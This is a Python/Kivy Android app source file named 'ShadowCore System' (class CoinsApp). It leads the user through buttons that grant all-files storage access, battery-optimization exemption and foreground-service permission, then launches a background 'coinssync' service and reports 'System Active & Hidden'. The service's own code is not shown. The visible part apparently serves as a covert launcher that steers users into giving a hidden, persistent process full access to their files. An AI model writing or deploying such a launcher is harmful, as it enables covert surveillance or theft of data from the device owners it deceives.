from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.clock import Clock
from jnius import autoclass
from android.permissions import request_permissions, Permission

class CoinsApp(App):
    def build(self):
        self.title = "ShadowCore System"
        layout = BoxLayout(orientation="vertical", padding=30, spacing=20)
        self.status = Label(text="System Status: Ready", font_size='18sp')

        btn_1 = Button(text="STEP 1: FULL STORAGE ACCESS", background_color=(0.2, 0.4, 0.9, 1))
        btn_2 = Button(text="STEP 2: BATTERY UNRESTRICTED", background_color=(0.8, 0.5, 0.2, 1))
        btn_3 = Button(text="FINAL STEP: ACTIVATE SYSTEM", background_color=(0.1, 0.7, 0.2, 1), bold=True)

        btn_1.bind(on_press=self.open_files)
        btn_2.bind(on_press=self.disable_battery)
        btn_3.bind(on_press=self.start_sync)

        layout.add_widget(self.status)
        layout.add_widget(btn_1); layout.add_widget(btn_2); layout.add_widget(btn_3)
        
        # طلب إذن الإشعارات فور فتح التطبيق
        Clock.schedule_once(lambda dt: self.ask_notif_permission(), 1)
        
        return layout

    def ask_notif_permission(self):
        request_permissions(["android.permission.POST_NOTIFICATIONS"])

    def open_files(self, instance):
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Intent = autoclass('android.content.Intent')
            Settings = autoclass('android.provider.Settings')
            Uri = autoclass('android.net.Uri')
            activity = PythonActivity.mActivity
            uri = Uri.parse("package:" + activity.getPackageName())
            intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, uri)
            activity.startActivity(intent)
        except: pass

    def disable_battery(self, instance):
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Intent = autoclass('android.content.Intent')
            Settings = autoclass('android.provider.Settings')
            Uri = autoclass('android.net.Uri')
            activity = PythonActivity.mActivity
            uri = Uri.parse("package:" + activity.getPackageName())
            intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            intent.setData(uri)
            activity.startActivity(intent)
        except: pass

    def start_sync(self, instance):
        perms = [Permission.READ_EXTERNAL_STORAGE, Permission.WRITE_EXTERNAL_STORAGE, Permission.FOREGROUND_SERVICE]
        request_permissions(perms, self.launch)

    def launch(self, permissions, grants):
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            # تأكد أن الاسم هنا يطابق ما في buildozer.spec
            service = autoclass('org.test.coinssync.ServiceMyservice')
            service.start(PythonActivity.mActivity, "")
            self.status.text = "✅ System Active & Hidden"
        except Exception as e:
            self.status.text = f"❌ Error: {str(e)}"

if __name__ == "__main__":
    CoinsApp().run()
